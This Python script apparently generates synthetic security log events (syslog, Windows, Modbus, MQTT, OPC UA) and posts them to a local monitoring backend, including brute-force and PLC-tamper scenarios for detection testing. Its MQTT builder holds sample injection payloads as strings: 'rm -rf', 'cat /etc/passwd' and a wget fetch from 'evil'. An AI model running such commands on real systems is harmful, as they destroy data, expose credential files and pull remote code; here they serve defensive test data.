"""Synthetic event generator for HyperPlane (Week 4).

Pushes NormalisedEvent payloads to the running backend's POST /events/ endpoint
so the dashboard has live data to render — and so the agent pipeline (Weeks 6+)
has a steady stream of realistic-looking incidents to investigate.

Two modes (locked Week 4):
- PURE_RANDOM       — independent events picked across the 5 parsers with
                      weighted probability. No correlation between events.
- SCENARIO_CORRELATED — roughly 1 in 5 batches is a multi-event "scenario"
                        where several events share a correlation_id so the
                        Triage/Detection agents can stitch them together.

Two built-in scenarios:
- "ssh_bruteforce"   — 10 syslog auth.login_failed events from the same src,
                       escalating severity, single correlation_id.
- "modbus_tamper"    — a Modbus register_write followed by an out-of-range
                       opcua.node_out_of_range on the same asset, sharing
                       a correlation_id.

Config (env vars, GEN_*):
  HYPERPLANE_API       base URL (default http://localhost:8000)
  EVENTS_API_KEY       X-API-Key header value (must match backend)
  GEN_MODE             "PURE_RANDOM" | "SCENARIO_CORRELATED"
                       (default SCENARIO_CORRELATED)
  GEN_BATCH_SIZE       events per batch (default 4)
  GEN_INTERVAL_SEC     seconds between batches (default 8)
  GEN_MAX_BATCHES      stop after this many batches (default 0 = unlimited)

Run inside the backend container:
    docker exec hyperplane-backend python -m scripts.generator

The generator NEVER writes to Postgres directly. It only calls POST /events/
so we exercise the full pipeline (parser → normalizer → auth → route → DB).
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import sys
import uuid
from datetime import datetime, timezone
from typing import Callable

import httpx

# We import the parsers so the generator pre-parses raw lines into full
# NormalisedEvent payloads. Without this, the random batches would be
# missing event_type/severity/etc. and the /events/ route would 422.
# The backend will re-validate (and accept) the result — but we exercise
# the parser logic in the generator, which is realistic: a real ingest
# daemon usually pre-parses before posting.
from app.ingestion.parsers import syslog, evtx, modbus, mqtt, opcua  # noqa: E402


# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

API = os.environ.get("HYPERPLANE_API", "http://localhost:8000")
API_KEY = os.environ.get("EVENTS_API_KEY", "")
MODE = os.environ.get("GEN_MODE", "SCENARIO_CORRELATED").upper()
BATCH_SIZE = int(os.environ.get("GEN_BATCH_SIZE", "4"))
INTERVAL = float(os.environ.get("GEN_INTERVAL_SEC", "8"))
MAX_BATCHES = int(os.environ.get("GEN_MAX_BATCHES", "0"))  # 0 = unlimited

logging.basicConfig(
    level=os.environ.get("LOG_LEVEL", "INFO"),
    format="%(asctime)s [gen] %(levelname)s %(message)s",
)
log = logging.getLogger("generator")

# Parser weights — sums to 100. Tilted toward syslog because that's the
# largest real-world log source.
PARSER_WEIGHTS = {
    "syslog": 50,
    "evtx": 20,
    "modbus": 15,
    "mqtt": 10,
    "opcua": 5,
}


# ---------------------------------------------------------------------------
# Synthetic line builders — one per parser
# ---------------------------------------------------------------------------


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def build_syslog_line() -> str:
    """Pick a syslog template and fill in realistic entities."""
    hosts = ["web-01", "db-02", "app-03", "jump-04"]
    users = ["root", "admin", "manu", "svc_deploy", "guest"]
    srcs = ["203.0.113.42", "198.51.100.7", "192.0.2.99", "10.0.0.55"]
    host = random.choice(hosts)
    user = random.choice(users)
    src = random.choice(srcs)

    template = random.choice(
        [
            f"Jun 28 09:14:01 {host} sshd[1234]: Failed password for {user} from {src} port 54321 ssh2",
            f"Jun 28 09:14:02 {host} sshd[1234]: Accepted publickey for {user} from {src} port 54321 ssh2",
            f"Jun 28 09:14:03 {host} sudo: pam_unix(sudo:auth): authentication failure; logname={user} uid=1000 tty=/dev/pts/0",
            f"Jun 28 09:14:04 {host} sshd[1234]: pam_unix(sshd:session): session opened for user {user} by (uid=0)",
            f"Jun 28 09:14:05 {host} systemd[1]: Started Daily apt download activities.",
        ]
    )
    return template


def build_evtx_xml() -> str:
    """Build a minimal Windows Event Log XML record."""
    eid = random.choice([4625, 4624, 7045, 4688])
    user = random.choice(["Administrator", "manu", "svc_sql", "guest"])
    host = random.choice(["WIN-DC01", "WIN-WEB02", "WIN-APP03"])
    src = random.choice(["10.0.0.10", "192.168.1.50", "172.16.0.7"])

    data_pairs = {
        4625: f'<Data Name="TargetUserName">{user}</Data><Data Name="IpAddress">{src}</Data><Data Name="LogonType">3</Data><Data Name="WorkstationName">{host}</Data>',
        4624: f'<Data Name="TargetUserName">{user}</Data><Data Name="IpAddress">{src}</Data><Data Name="LogonType">2</Data><Data Name="WorkstationName">{host}</Data>',
        7045: '<Data Name="ServiceName">WinRM</Data><Data Name="ImagePath">C:\\Windows\\System32\\svchost.exe</Data>',
        4688: f'<Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data><Data Name="TargetUserName">{user}</Data>',
    }[eid]

    return (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "<System>"
        f"<EventID>{eid}</EventID>"
        f"<Computer>{host}</Computer>"
        "<Provider Name='Microsoft-Windows-Security-Auditing'/>"
        "</System>"
        f"<EventData>{data_pairs}</EventData>"
        "</Event>"
    )


def build_modbus_line() -> str:
    """Build a textual Modbus/TCP frame as most gateways emit to syslog."""
    src = random.choice(["10.0.0.5", "10.0.0.6", "10.0.0.7"])
    dst = random.choice(["plc-1", "plc-2", "plc-7", "rtu-3"])
    fc = random.choice([3, 6, 16, 5])
    addr = random.randint(40001, 40100)
    if fc in (5, 6):
        return f"mb:tcp:{src} -> {dst} fc={fc} addr={addr} val={random.randint(0, 1000)}"
    if fc == 16:
        return f"mb:tcp:{src} -> {dst} fc={fc} addr={addr} qty={random.randint(1, 20)}"
    return f"mb:tcp:{src} -> {dst} fc={fc} addr={addr} qty={random.randint(1, 10)}"


def build_mqtt_line() -> str:
    """Build an MQTT broker-style line (topic + payload)."""
    topic_choices = [
        "factory/sensor-7/temp",
        "factory/sensor-8/pressure",
        "factory/plc-1/cmd",
        "factory/plc-2/command",
        "factory/line-3/sensor/vibration",
    ]
    topic = random.choice(topic_choices)
    if "/cmd" in topic or "/command" in topic:
        # ~15% chance: suspicious injection payload
        if random.random() < 0.15:
            payload = random.choice(
                ['{"action":"write","val":"rm -rf /tmp/x"}',
                 '{"action":"exec","cmd":"cat /etc/passwd"}',
                 '{"action":"exec","cmd":"wget http://evil/x"}']
            )
        else:
            payload = random.choice(
                ['{"action":"write","reg":40100,"val":1}',
                 '{"action":"read","reg":40001}']
            )
    else:
        # Sensor reading
        val = round(random.uniform(15.0, 85.0), 2)
        payload = json.dumps({"value": val, "unit": "C"})
    return f"{topic} {payload}"


def build_opcua_line() -> str:
    """Build an OPC UA-style node reading line."""
    nodes = [
        "opcua://plant/furnace-3/temp",
        "opcua://plant/furnace-3/pressure",
        "opcua://plant/line-1/speed",
        "opcua://plant/boiler-2/level",
    ]
    node = random.choice(nodes)
    # ~10% chance: out-of-range reading
    if random.random() < 0.10:
        value = round(random.uniform(1100.0, 1500.0), 1)
    else:
        value = round(random.uniform(20.0, 950.0), 1)
    quality = random.choice(["Good", "Good", "Good", "Uncertain"])
    return f"{node}  value={value}  quality={quality}"


LINE_BUILDERS: dict[str, Callable[[], str]] = {
    "syslog": build_syslog_line,
    "evtx": build_evtx_xml,
    "modbus": build_modbus_line,
    "mqtt": build_mqtt_line,
    "opcua": build_opcua_line,
}

# Parser dispatch — generator pre-parses raw lines into NormalisedEvent so
# the /events/ route receives a complete payload (event_type, severity, etc.).
PARSERS: dict[str, Callable[[str], object]] = {
    "syslog": syslog.parse,
    "evtx": evtx.parse,
    "modbus": modbus.parse,
    "mqtt": mqtt.parse,
    "opcua": opcua.parse,
}


def _pick_parser() -> str:
    """Weighted random pick across the 5 parsers."""
    parsers = list(PARSER_WEIGHTS.keys())
    weights = list(PARSER_WEIGHTS.values())
    return random.choices(parsers, weights=weights, k=1)[0]


# ---------------------------------------------------------------------------
# Scenarios (SCENARIO_CORRELATED mode only)
# ---------------------------------------------------------------------------


def scenario_ssh_bruteforce() -> list[dict]:
    """10 failed logins from the same src against the same host.

    All share a single correlation_id so the Triage agent can stitch them
    into one incident ("brute force from X against Y").
    """
    corr = uuid.uuid4()
    src = random.choice(["203.0.113.42", "198.51.100.7", "192.0.2.99"])
    host = random.choice(["web-01", "jump-04", "db-02"])
    users = random.sample(["root", "admin", "oracle", "postgres", "ubuntu", "ec2-user"], k=6)
    events: list[dict] = []
    for i in range(10):
        events.append(
            {
                "event_id": str(uuid.uuid4()),
                "correlation_id": str(corr),
                "observed_at": _now_iso(),
                "domain": "it",
                "event_type": "auth.login_failed",
                "severity": 4 + i,  # escalates per attempt
                "confidence": 0.9,
                "src": src,
                "user": users[i % len(users)],
                "host": host,
                "raw": f"Jun 28 09:14:0{i} {host} sshd[1234]: Failed password for {users[i % len(users)]} from {src} port {54321 + i} ssh2",
                "parser": "syslog",
                "vendor": "linux",
                "tags": ["sshd", "bruteforce"],
                "labels": {"attempt": str(i + 1), "method": "password"},
            }
        )
    return events


def scenario_modbus_tamper() -> list[dict]:
    """A Modbus write + an out-of-range OPC UA reading on the same asset.

    Shares correlation_id so the Detection agent can connect "operator wrote
    a bad setpoint" with "the actuator went out of range".
    """
    corr = uuid.uuid4()
    asset = random.choice(["plc-1", "plc-2", "plc-7"])
    src = random.choice(["10.0.0.5", "10.0.0.6"])
    return [
        {
            "event_id": str(uuid.uuid4()),
            "correlation_id": str(corr),
            "observed_at": _now_iso(),
            "domain": "ot",
            "event_type": "modbus.register_write",
            "severity": 8,
            "confidence": 0.95,
            "src": src,
            "asset_id": asset,
            "raw": f"mb:tcp:{src} -> {asset} fc=16 addr=40100 qty=10",
            "parser": "modbus",
            "vendor": "schneider",
            "tags": ["modbus", "tamper"],
            "labels": {"fc": "16", "addr": "40100", "qty": "10"},
        },
        {
            "event_id": str(uuid.uuid4()),
            "correlation_id": str(corr),
            "observed_at": _now_iso(),
            "domain": "ot",
            "event_type": "opcua.node_out_of_range",
            "severity": 7,
            "confidence": 0.9,
            "asset_id": asset,
            "raw": f"opcua://plant/{asset}/temp  value={round(random.uniform(1100.0, 1400.0), 1)}  quality=Good",
            "parser": "opcua",
            "vendor": "schneider",
            "tags": ["opcua", "out-of-range"],
            "labels": {"node": f"plant/{asset}/temp"},
        },
    ]


SCENARIOS: list[Callable[[], list[dict]]] = [
    scenario_ssh_bruteforce,
    scenario_modbus_tamper,
]


# ---------------------------------------------------------------------------
# HTTP client
# ---------------------------------------------------------------------------


def _headers() -> dict:
    h = {"Content-Type": "application/json"}
    if API_KEY:
        h["X-API-Key"] = API_KEY
    return h


async def _post_batch(client: httpx.AsyncClient, batch: list[dict]) -> dict:
    r = await client.post(
        f"{API}/events/", json=batch, headers=_headers(), timeout=15
    )
    r.raise_for_status()
    return r.json()


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------


def _build_random_event(parser: str) -> dict:
    """Build a single NormalisedEvent dict by:
    1. generating a realistic raw line with the parser's line builder
    2. running the parser to fill event_type/severity/entities
    3. serialising to a dict for the /events/ POST
    """
    raw_line = LINE_BUILDERS[parser]()
    ev = PARSERS[parser](raw_line)
    return ev.model_dump(mode="json")


async def main() -> int:
    log.info(
        "starting generator mode=%s batch=%d interval=%.1fs api=%s",
        MODE, BATCH_SIZE, INTERVAL, API,
    )

    async with httpx.AsyncClient() as client:
        # Wait for backend to come up — backend may take 5-10s to start
        # (alembic + uvicorn). Retry the health check until success.
        for attempt in range(1, 31):
            try:
                r = await client.get(f"{API}/health", timeout=5)
                r.raise_for_status()
                log.info("backend healthy (attempt %d): %s", attempt, r.json())
                break
            except Exception as e:
                if attempt == 30:
                    log.error("backend never came up after 30 attempts — %s", e)
                    return 1
                log.warning("backend not ready (attempt %d): %s", e)
                await asyncio.sleep(2)

        batch_num = 0
        while True:
            batch_num += 1
            if MAX_BATCHES and batch_num > MAX_BATCHES:
                log.info("reached GEN_MAX_BATCHES=%d, stopping", MAX_BATCHES)
                break

            # Decide: scenario batch (if mode allows) or pure random batch
            events: list[dict]
            reason: str
            if MODE == "SCENARIO_CORRELATED" and random.random() < 0.20:
                scenario = random.choice(SCENARIOS)
                events = scenario()
                reason = f"SCENARIO {scenario.__name__}"
            else:
                events = [_build_random_event(_pick_parser()) for _ in range(BATCH_SIZE)]
                reason = "PURE_RANDOM"

            try:
                resp = await _post_batch(client, events)
                log.info(
                    "batch %d: %s → accepted=%d duplicates=%d",
                    batch_num, reason, resp["accepted"], resp["duplicates"],
                )
            except httpx.HTTPStatusError as e:
                log.error(
                    "batch %d HTTP %s: %s",
                    batch_num, e.response.status_code, e.response.text[:300],
                )
            except Exception as e:
                log.error("batch %d failed: %s", batch_num, e)

            await asyncio.sleep(INTERVAL)

    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))